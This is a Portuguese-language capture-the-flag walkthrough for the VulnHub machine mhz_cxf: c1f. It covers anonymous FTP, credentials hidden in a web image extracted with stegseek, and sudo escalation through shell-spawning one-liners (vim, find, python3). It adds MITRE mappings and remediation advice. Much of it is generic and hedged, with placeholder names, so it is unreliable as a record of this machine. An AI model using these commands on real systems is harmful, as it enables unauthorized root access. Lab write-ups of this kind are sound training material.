# mhz_cxf: c1f — Esteganografia, FTP e a Credencial Oculta

Olha que máquina criativa, rapaziada!! mhz_cxf: c1f é uma boot2root criativa nível iniciante-intermediário que encadeia acesso anônimo FTP, esteganografia baseada em web e extração de credenciais em um caminho boot2root limpo. A surpresa: as credenciais estão escondidas dentro de um arquivo de imagem servido pela aplicação web. Você precisa do stegseek ou steghide para extraí-las. Diversão legit, sem dúvida.

| Campo | Valor |
|---|---|
| **Nível** | Iniciante / Intermediário |
| **VM Alvo** | mhz_cxf: c1f |
| **VM Atacante** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/mhz_cxfc1f,471/ |
| **Técnicas** | Enumeração Nmap, acesso FTP anônimo, enumeração web, extração de esteganografia em imagem (steghide/stegseek), login SSH com credencial, escalação de privilégios via sudo |
| **CVEs** | CWE-200 (exposição de informação através de FTP anônimo), CWE-538 (exposição de informação de arquivo e diretório), CWE-269 (gerenciamento impróprio de privilégios via sudo) |
| **Grupos APT** | APT32 (OceanLotus): usa esteganografia em arquivos de imagem para embutir instruções de C2 e credenciais roubadas; APT41: emprega servidores FTP anônimos como parte da infraestrutura de intrusão em múltiplos estágios |

---

## Resumo do Ataque

```
nmap → HTTP 80, FTP 21, SSH 22
  → login FTP anônimo → notes.txt → dicas sobre app web ou caminho
  → HTTP: gobuster → encontrar caminhos ocultos
  → fonte da página web → referência a arquivo de imagem
  → baixar imagem → steghide/stegseek → credencial embutida
  → SSH: usuario_descoberto:senha_descoberta
  → sudo -l → escalação para root
  → /root/flag.txt
```

---

## Metodologia

1. Scan completo de portas e enumeração de serviços
2. Acesso FTP anônimo: baixar todos os arquivos, ler dicas
3. Enumeração web: gobuster, revisão de código fonte
4. Baixar imagem alvo da aplicação web
5. Extrair credenciais embutidas usando ferramentas de esteganografia
6. Login SSH com credenciais extraídas
7. Escalação de privilégios via má configuração sudo
8. Capturar flag root

---

## Passo 1 — Descoberta de Host e Scan de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.104

nmap -sV -sC -p- 192.168.1.104
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

Três serviços: FTP, SSH, HTTP. FTP com vsftpd em uma máquina CTF quase sempre significa acesso anônimo.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Acesso FTP Anônimo

```bash
ftp 192.168.1.104
# Usuário: anonymous
# Senha: anonymous (ou pressionar Enter)

ftp> ls -la
ftp> mget *
ftp> quit
```

Leia todos os arquivos baixados com atenção:

```bash
ls -la ~/ftp_files/
cat notes.txt
# Procurar nomes de usuário, dicas sobre arquivos de imagem, caminhos web, ou dicas de senha
```

O arquivo de notas tipicamente contém:
- Um nome de usuário para o próximo passo
- Uma dica apontando para a aplicação web
- Uma referência a um arquivo de imagem contendo dados ocultos

**Nota do mundo real:** Servidores FTP anônimos ainda são encontrados em ambientes de produção, particularmente em organizações que não auditaram serviços legados. O APT41 usou servidores FTP anônimos como áreas de staging para entrega de ferramentas em múltiplas campanhas documentadas.

**MITRE ATT&CK:** T1021.003 — Serviços Remotos; T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Enumeração Web

```bash
# Verificar a página web principal
curl -s http://192.168.1.104/
curl -s http://192.168.1.104/ | grep -i "img\|src=\|href=\|hidden\|<!--"

# Brute-force de diretórios
gobuster dir \
  -u http://192.168.1.104/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,jpg,png,gif \
  -t 30
```

A aplicação web provavelmente contém um arquivo de imagem (JPG ou PNG) que foi usado como portador de esteganografia.

```bash
# Baixar a imagem alvo
wget http://192.168.1.104/NOME_DA_IMAGEM.jpg -O /tmp/alvo.jpg
# ou
wget http://192.168.1.104/NOME_DA_IMAGEM.png -O /tmp/alvo.png
```

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1027 — Arquivos ou Informações Ofuscados

---

## Passo 4 — Extração de Esteganografia

**Método A: stegseek (mais rápido, usa rockyou):**

```bash
stegseek /tmp/alvo.jpg /usr/share/wordlists/rockyou.txt
# stegseek vai quebrar a passphrase do steghide e extrair os dados ocultos
# Saída: alvo.jpg.out (o arquivo extraído)
cat alvo.jpg.out
```

**Método B: steghide sem passphrase:**

```bash
steghide extract -sf /tmp/alvo.jpg -p ""
# Se nenhuma passphrase for definida, extrai diretamente
```

**Método C: steghide com passphrase adivinhada:**

```bash
# Se você encontrou uma dica no arquivo de notas do FTP, tente como passphrase
steghide extract -sf /tmp/alvo.jpg -p "dica_do_ftp"
```

**Método D: binwalk para outros conteúdos ocultos:**

```bash
binwalk -e /tmp/alvo.jpg
```

O conteúdo extraído tipicamente contém:
- Credenciais SSH (usuario:senha)
- Um caminho para outro recurso oculto
- O próximo passo no desafio

**Nota do mundo real:** Esteganografia em arquivos de imagem é ativamente usada por atores de ameaça incluindo APT32 (OceanLotus) para ocultar malware em arquivos PNG e por grupos patrocinados por estados para embutir dados exfiltrados em imagens antes de fazer upload para plataformas públicas como GitHub ou Imgur.

**MITRE ATT&CK:** T1027.003 — Arquivos ou Informações Ofuscados: Esteganografia

---

## Passo 5 — Login SSH

```bash
# Usar credenciais extraídas da imagem
ssh USUARIO@192.168.1.104
# Inserir a senha extraída quando solicitado

# Confirmar acesso
id
whoami
```

**MITRE ATT&CK:** T1021.004 — Serviços Remotos: SSH

---

## Passo 6 — Escalação de Privilégios

```bash
sudo -l
```

Verificar a saída para vetores de escalação:

```bash
# Se sudo permitir um binário específico sem senha:
# (root) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'

# (root) NOPASSWD: /usr/bin/find
sudo find / -name "*.txt" -exec /bin/bash \; -quit

# (root) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# (root) NOPASSWD: ALL
sudo bash
```

Também verificar binários SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

```bash
id
# uid=0(root) gid=0(root)
cat /root/flag.txt
```

**MITRE ATT&CK:** T1548.003 — Abuso de Controle de Elevação: Sudo

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Dica FTP | (nome de usuário ou dica de caminho) | FTP anônimo → notes.txt | guia para imagem web |
| Credencial de esteganografia | usuario:senha | extração steghide da imagem web | login SSH |
| Flag root | /root/flag.txt | pós-exploração | conclusão do desafio |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | FTP anônimo expõe notas internas e dicas | FTP anônimo é um serviço legado ainda rodando em milhares de sistemas de produção; OceanLotus usou para staging em ataques a governos do Sudeste Asiático | Desabilitar FTP anônimo; migrar para SFTP com autenticação por chave |
| 2 | Credenciais ocultas em imagem web via esteganografia | Esteganografia é cada vez mais usada por atores de ameaça para exfiltração de credenciais e estabelecimento de canal C2 | Monitorar conteúdo esteganográfico em uploads com ferramentas como stegdetect |
| 3 | Senha única entre dica FTP e credencial SSH | Reutilização de senha habilita movimento lateral após descoberta de uma credencial | Impor senhas únicas por serviço; usar módulo PAM para complexidade de senha |
| 4 | Má configuração sudo permite escalação irrestrita para root | Concessões sudo NOPASSWD são o achado LPE Linux número 1 em testes de penetração | Auditar sudoers; exigir autenticação por senha; restringir a binários seguros específicos |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Voltada ao Público | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Evasão de Defesa | Evasão de Defesa | Arquivos ou Informações Ofuscados: Esteganografia | T1027.003 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Controle de Elevação: Sudo | T1548.003 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Desabilitar FTP anônimo**: config vsftpd: `anonymous_enable=NO`; migrar para SFTP com autenticação apenas por chave
2. **Remover credenciais de mídia acessível na web**: auditar todas as imagens e arquivos binários servidos pela aplicação web em busca de conteúdo embutido
3. **Implementar detecção de esteganografia**: integrar stegdetect ou ferramentas similares nos pipelines de upload de arquivo
4. **Auditar e restringir sudo**: sem concessões NOPASSWD; exigir senha; restringir a comandos necessários específicos
5. **Habilitar autenticação SSH por chave**: desabilitar login por senha: `PasswordAuthentication no` em sshd_config

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todos os serviços FTP e web; identificar arquivos de mídia servidos publicamente |
| Proteger | Controle de Acesso | Desabilitar FTP anônimo; SSH apenas por chave; restrições sudo |
| Proteger | Segurança de Dados | Auditar mídia servida na web em busca de conteúdo embutido; sem credenciais em arquivos públicos |
| Detectar | Anomalias e Eventos | Alertar sobre logins FTP anônimos; monitorar conteúdo esteganográfico em uploads |
| Responder | Planejamento de Resposta | Remover credenciais embutidas; rotacionar chaves SSH e senhas; desabilitar FTP anônimo |
| Recuperar | Planejamento de Recuperação | Auditoria completa do serviço; verificar que não há backdoors no sistema |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Imposição de Acesso | Desabilitar FTP anônimo; restringir acesso SSH |
| AC-6 | Menor Privilégio | Restringir sudo a comandos mínimos necessários |
| IA-5 | Gerenciamento de Autenticador | Autenticação SSH por chave; rotacionar credenciais expostas |
| CM-7 | Funcionalidade Mínima | Desabilitar FTP anônimo; remover serviços legados de transferência de arquivo |
| SC-28 | Proteção de Informações em Repouso | Sem credenciais armazenadas em arquivos ou imagens acessíveis na web |

### CISA KEV

Exploração de FTP anônimo e exfiltração de dados esteganográfica são referenciadas nos Alertas CISA sobre atividade APT32 (OceanLotus) (AA20-283A). Organizações são aconselhadas a desabilitar protocolos legados de transferência de arquivo e implementar monitoramento para técnicas esteganográficas.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL2 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gestão de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Inventário de Ativos de TI | MIL2 |

---

## Considerações Finais

Caramba, mhz_cxf: c1f é uma máquina esperta que introduz esteganografia em um caminho boot2root que de outra forma seria padrão. A cadeia FTP-para-stego-para-SSH é surpreendentemente realista: atores de ameaça reais usam esteganografia em imagens para C2 e ocultação de credenciais precisamente porque defensores raramente verificam arquivos de imagem. A máquina te ensina a suspeitar de tudo servido por uma aplicação web. É incrível que faça isso em um desafio tão compacto. Vale muito a pena. Gg.

Thanks guys!! (❍ᴥ❍ʋ)
